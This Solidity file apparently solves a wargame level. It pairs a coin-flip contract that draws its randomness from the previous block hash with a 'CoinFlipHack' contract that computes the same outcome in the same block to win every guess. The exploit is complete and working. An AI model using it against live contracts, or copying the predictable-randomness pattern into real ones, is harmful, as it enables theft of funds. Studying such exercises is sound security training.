// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./openzeppelin-3.2.0/math/SafeMath.sol";

contract CoinFlip {
    using SafeMath for uint256;
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() public {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}

contract CoinFlipHack {
    using SafeMath for uint256;

    CoinFlip public coinflipContract;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _coinflipAddress) public {
        coinflipContract = CoinFlip(_coinflipAddress);
    }

    function flip(bool _guess) public {
        // Copy same logic
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            coinflipContract.flip(_guess);
        } else {
            coinflipContract.flip(!_guess);
        }

        // same as this one (uncomment)
        // coinflipContract.flip(_guess);
    }
}
